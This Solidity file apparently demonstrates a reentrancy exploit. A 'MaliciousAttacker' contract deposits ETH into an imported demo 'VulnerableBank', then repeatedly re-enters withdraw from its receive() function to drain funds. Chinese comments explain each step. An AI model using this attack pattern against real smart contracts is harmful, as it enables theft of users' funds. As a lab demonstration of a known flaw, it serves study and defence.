// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract MaliciousAttacker {
    VulnerableBank public bank;
    uint256 public callCount = 0;
    uint256 public constant MAX_CALLS = 10; // Limit recursive calls to avoid running out of gas

    constructor(address payable _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // 攻击入口：存 1 ETH，然后疯狂提现
    function attack() external payable {
        require(msg.value >= 1 ether, "Must send at least 1 ETH");
        // 先存款建立余额
        bank.deposit{value: msg.value}();
        // 然后开始提取，触发重入
        bank.withdraw(msg.value); // 提取刚存入的金额
    }

    // ⚡ 关键！当收到 ETH 时自动重入
    receive() external payable {
        if (callCount < MAX_CALLS) {
            callCount++;
            // 检查自己在银行的余额是否足够进行下一次提取
            uint256 myBalance = bank.balances(address(this));
            if (myBalance >= 1 ether) {
                bank.withdraw(1 ether);
            }
        }
    }

    // 提现到安全钱包
    function withdrawAll() external {
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Withdraw failed");
    }
    
    function getCallCount() external view returns (uint256) {
        return callCount;
    }
}